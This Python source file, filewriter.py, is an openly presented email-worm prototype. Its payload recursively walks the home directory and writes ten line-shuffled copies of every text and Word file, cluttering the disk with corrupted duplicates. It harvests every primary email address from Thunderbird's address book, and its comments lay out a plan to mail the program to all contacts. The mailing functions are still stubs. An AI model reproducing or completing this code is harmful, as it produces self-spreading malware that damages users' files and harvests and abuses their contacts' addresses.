#!/usr/bin/python

"""
filewriter.py

(c) 2022 telekobold <mail@telekobold.de>

This program was written solely for the joy of exploring how things work
and the intension of sharing accumulated experiences with others. Please
do not abuse it to cause any harm!
"""


# --------------------------------------------------------------------------
# ------------------------------- imports ----------------------------------
# --------------------------------------------------------------------------

import os
import mimetypes
import random
import docx
import sys
import sqlite3


# --------------------------------------------------------------------------
# -------------------- global variables and constants ----------------------
# --------------------------------------------------------------------------

FILES_TO_WRITE_PER_DIR = 10




# --------------------------------------------------------------------------
# ----------------------- payload helper functions -------------------------
# --------------------------------------------------------------------------

def users_home_dir():
    """
    :returns: the user's home directory on both Unix and Windows platforms
    """
    # return os.path.expanduser("~")
    # return "/home/telekobold/TestVerzeichnis/OwnCloud-Test-Kopie" # For testing purposes
    return "/home/telekobold/TestVerzeichnis/SS19-Test-Kopie" # For testing purposes


def is_file_type(file, filetype):
    """
    :file:     a relative or absolute file path
    :filetype: one of the file types "doc", "docx", "jpeg", "jpg", "mp3", "mp4",
               "odt", "ogg", "png", "txt", "wav"
    :returns: `True` if the passed `file` is of the specified file type, false otherwise
    """
    mime_types = {"docx" : "application/vnd.openxmlformats-officedocument.wordprocessingml.document", 
                  "jpeg" : "image/jpeg", 
                  "jpg" : "image/jpeg", 
                  "mp3" : "audio/mpeg", 
                  "mp4" : "video/mp4",
                  "odt" : "application/vnd.oasis.opendocument.text", 
                  "ogg" : "audio/ogg", 
                  "png" : "image/png", 
                  "txt" : "text/plain", 
                  "wav" : "audio/x-wav"}
    if file.endswith(filetype):
        return True
    # TODO: mimetypes.guess_type only guesses the MIME type using the file name extension.
    # Provide function which determines the MIME type without having 
    # the file name extension instead (otherwise, this check doesn't make much sense).
    elif mimetypes.guess_type(file)[0] is mime_types[filetype]:
        return True
    return False


def traverse_dirs(curr_file):
    """
    Recursively traverses all directories and subdirectories
    starting from `curr_file` and calls the appropriate 
    processing function for each file.
    """
    if os.path.islink(curr_file):
        print("detected symlink {}".format(curr_file)) # test output
        # TODO: Maybe do the same as for directories instead of just ignoring symlinks?
        return
    if os.path.isfile(curr_file):
        if is_file_type(curr_file, "txt"):
            # print("TEXT file {}".format(curr_file)) # test output
            process_text_file(curr_file)
        elif is_file_type(curr_file, "docx"):
            # print("DOCX file {}".format(curr_file)) # test output
            process_docx_file(curr_file)
        """
        elif is_file_type(curr_file, "odt"):
            print("ODT file {}".format(curr_file)) # test output
            process_odt_file(curr_file)
        elif is_file_type(curr_file, "jpeg") or is_file_type(curr_file, "jpg") or is_file_type(curr_file, "png"):
            print("image file {}".format(curr_file)) # test output
            process_image_file(curr_file)
        elif is_file_type(curr_file, "mp3") or is_file_type(curr_file, "ogg"):
            print("music file {}".format(curr_file)) # test output
            process_music_file(curr_file)
        """
    if os.path.isdir(curr_file):
        # print("DIR {}".format(curr_file)) # test output
        for file in os.listdir(curr_file):
            # TODO: Adapt for Windows ("\" instead of "/").
            traverse_dirs("{}/{}".format(curr_file, file))
            
            
def read_text_file_to_dict(filename):
    """
    Reads the passed text file line by line.
    
    :returns: a dictionary whose keys are the line numbers (integer values) 
              and the appropriate values being the content of this line (string values).
    """
    result = {}
    with open(filename, "r") as file:
        lines = file.readlines()
    
    # NOTE: The line indexing stars with 0.
    for i, line in zip(range(len(lines)), lines):
        result[i] = line
        
    # print("read_text_file_to_dict: result = {}".format(result)) # test output
    return result


def shuffle_filename(filename):
    # Determine the lines the text file has and use this number of lines 
    # to randomly shuffle the positions of those lines.
    # TODO: Implement shuffling
    return filename
    
    
# TODO: Sometimes (when applying more than one times to a nested directory), 
# this function is appearantly called with n<=0 and empty docx files are generated!
def n_rand_numbers(n):
    """
    :n: The length of the list to return.
    :returns: a list of n numbers between 0 and n, randomly shuffled, 
    but unique (meaning that each number appears only once in the list); 
    `None` for n <= 0.
    """
    result = []
    
    if n <= 0:
        print("For n_rand_numbers, only positive values make sense!")
        return None
    while len(result) < n:
        i = random.randint(0,n)
        if i not in result:
            result.append(i)
    
    return result


def shuffle_dict_content(dictionary):
    """
    :dictionary: an arbitrary dictionary
    :returns: a dictionary which contains all values of the input dictionary, 
              but with randomly shuffled values.
    """
    result = {}
    rand_numbers = n_rand_numbers(len(dictionary)-1)
    # print("shuffle_dict_content(): rand_numbers = {}".format(rand_numbers)) # test output
    
    for i in range(len(dictionary)-1):
        result[i] = dictionary[rand_numbers[i]]
        
    return result


def write_dict_to_text_file(dictionary, filename):
    """
    Writes every value of `dictionary` to a new line of the text file with `filename`.
    
    :dictionary: the dictionary that should be written to a file.
    :filename: the name of the file that should be filled with dictionary's content.
    """
    with open(filename, "w") as file:
        for i in range(len(dictionary)):
            file.writelines(dictionary[i])
    
    
# TODO: Instead of writing the new files to the same directory as the "host" file, 
# write them to any existing directory in the standard user directory.
# TODO: Add error handling if file opening doesn't work (e.g. because of missing
# access rights). Instead, just continue to the next file.
def process_text_file(input_filename):
    """
    Creates `FILES_TO_WRITE_PER_DIR` new text files where each file contains 
    the content of the text file with `input_filename`, but with randomly shuffled
    content. The new files are created in the same directory as `input_filename`.
    
    :input_filename: The filename of the file that should be duplicated
                     multiple times with shuffled file name and content.
    """
    global FILES_TO_WRITE_PER_DIR
    input_file_content = read_text_file_to_dict(input_filename)
    
    for i in range(FILES_TO_WRITE_PER_DIR):
        # filename = shuffle_filename(input_filename)
        # TODO: Replace the if-else construct by shuffle_filename usage:
        filename = None
        if input_filename.endswith(".txt"):
            filename = input_filename[0:len(input_filename)-4:1] + str(i) + ".txt"
        else:
            filename = input_filename + str(i)
        file_content = shuffle_dict_content(input_file_content)
        write_dict_to_text_file(file_content, filename)
    
    
def write_dict_to_docx_file(dictionary, filename):
    """
    Writes every value of `dictionary` to a new line of the docx file with `filename`.
    
    :dictionary: the dictionary that should be written to a file.
    :filename: the name of the docx file that should be filled with dictionary's content.
    """
    document = docx.Document()
    paragraph = document.add_paragraph()
    for i in range(len(dictionary)):
        paragraph.add_run("{}\n".format(dictionary[i]))
    document.save(filename)


# TODO: Add error handling if file opening doesn't work (e.g. because of missing
# access rights). Instead, just continue to the next file.
def process_docx_file(input_filename):
    """
    Produces FILES_TO_WRITE_PER_DIR new docx files where each file contains 
    the content of this text file, but with randomly shuffled content.
    """
    global FILES_TO_WRITE_PER_DIR
    input_file_content = {}
    document = docx.Document(input_filename)
    # Read out the document's text:
    # TODO: Preserve the text's formatting
    for i, p in zip(range(sys.maxsize), document.paragraphs):
        input_file_content[i] = p.text
    # TODO: Read out the document's tables
    # TODO: Read out the document's pictures
    
    for i in range(FILES_TO_WRITE_PER_DIR):
        # filename = shuffle_filename(input_filename)
        # TODO: Use n_rand_numbers(n) for shuffling the file content
        filename = None
        if input_filename.endswith(".docx"):
            filename = input_filename[0:len(input_filename)-5:1] + str(i) + ".docx"
        else:
            filename = input_filename + str(i)
        file_content = shuffle_dict_content(input_file_content)
        write_dict_to_docx_file(file_content, filename)


def process_odt_file(file):
    """
    Produces FILES_TO_WRITE_PER_DIR new odt files where each file contains 
    the content of this text file, but with randomly shuffled content.
    """
    pass

    
def process_image_file(file):
    """
    Tries to recognize content from file name and loads similar pictures 
    from the internet using a startpage search.
    """
    pass


def process_music_file(file):
    """
    Tries to recognize content from file name and metadata and loads similar
    music from the internet using a startpage search.
    """
    pass



# --------------------------------------------------------------------------
# ---------------------- send email helper functions ------------------------
# --------------------------------------------------------------------------

    
def read_email_addresses_thunderbird():
    """
    :returns: a list of all email addresses contained in Thunderbird's `abook.sqlite` database
              if this database exists, None otherwise.
    """
    # TODO: Search for `abook.sqlite` on the file system
    database = "/home/telekobold/TestVerzeichnis/TestVerzeichnis/PythonTest/abook.sqlite"
    con = None
    email_addresses = []
    
    if os.path.isfile(database):
        with sqlite3.connect(database) as con:
            with con:
                cur = con.cursor()
                cur.execute("SELECT DISTINCT value FROM properties WHERE name='PrimaryEmail'")
                rows = cur.fetchall()
                for row in rows:
                    (email_addr,) = row # unpack the tuple returned by fetchall()
                    email_addresses.append(email_addr)
            return email_addresses
    else:
        return None


def send_emails_thunderbird():
    pass


def read_email_addresses_outlook():
    pass


def send_emails_thunderbird():
    pass



# --------------------------------------------------------------------------
# -------------------------- main functionality ----------------------------
# --------------------------------------------------------------------------

"""
Search all directories and subdirectoris beginning with the passed dir, 
read all files of every browsed directory,
and create FILES_TO_WRITE_PER_DIR new files for every read file
where each file has a randomly generated filename based on the filename of the read file
and containing the content of the read file, but with the words randomly shuffled.
"""
def payload():
    # TODO: The program does nothing if the passed directory doesn't exist.
    print("Started traversing dirs...") # test output
    traverse_dirs(users_home_dir())
    print("Finished traversing dirs!") # test output

    
"""
Send this program to all email addresses in the address book of the installed Thunderbird or Outlook.
"""
def send_email():
    email_addresses = read_email_addresses_thunderbird()
    print(email_addresses) # test output
    # If Mozilla Thunderbird is installed, read the whole address book from Thunderbird (SQLite database) and send this program to each address of the address book
    # If Outlook is installed, do the same for Outlook. This check only needs to be done if the operating system is Windows.
    # TODO: Ensure that emails are not sent to the from address


if __name__ == "__main__":
    # TODO: Start two different threads, one for executing the payload and one for sending emails.
    payload()
    # send_email()
